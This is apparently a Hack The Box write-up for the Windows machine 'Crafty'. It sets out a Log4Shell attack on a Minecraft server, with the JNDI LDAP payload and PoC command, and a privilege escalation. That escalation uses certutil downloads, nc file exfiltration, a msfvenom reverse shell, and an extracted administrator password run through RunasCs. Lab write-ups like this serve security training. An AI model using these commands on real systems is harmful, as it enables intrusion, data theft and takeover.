---
title: HTB-Crafty
draft: false
tags:
  - htb
  - windows
  - easy
  - minecraft
  - log4j
  - tlauncher
  - runascs
  - jd-gui
  - jar
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/Crafty.png)

## Information Gathering
### Rustscan

`rustscan --addresses 10.10.11.249 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-2.png)

`sudo nmap -sVC -p 80,25565 crafty.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-3.png)

## Enumeration
### HTTP - TCP 80

crafty.htb /etc/hosts

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image.png)


### TCP 25565

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-1.png)

## Log4j

Minecraft 1.16.5

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-4.png)

https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847


https://tlauncher.org/

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-11.png)

`sudo java -jar TLauncher.jar`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-5.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-6.png)




![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-7.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-8.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-9.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-10.png)

https://github.com/kozmer/log4j-shell-poc

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-12.png)

`sudo python3 poc.py --userip 10.10.14.36 --webport 80 --lport 4444`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-13.png)

t

`${jndi:ldap://10.10.14.36:1389/a}`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-15.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-14.png)

## Privesc: svc_minecraft to administrator


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-16.png)

`python3 -m http.server 1234`

`certutil.exe -urlcache -split -f http://10.10.14.36:1234/nc.exe`


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-17.png)

.\nc.exe 10.10.14.36 1235 < c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-18.png)


sudo nc -lp 1235 > playercounter-1.0-SNAPSHOT.jar

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-19.png)

### JD-GUI

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-20.png)


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-21.png)

s67u84zKq8IXw

### RunasCs
certutil.exe -urlcache -split -f http://10.10.14.36:1234/RunasCs.exe


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-22.png)

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=1337 -f exe > rev.exe

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-23.png)

certutil.exe -urlcache -split -f http://10.10.14.36:1234/rev.exe

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-24.png)


.\RunasCs.exe administrator s67u84zKq8IXw ".\rev.exe"  

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-25.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/crafty/image-26.png)


## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847
- https://tlauncher.org/
- https://github.com/kozmer/log4j-shell-poc


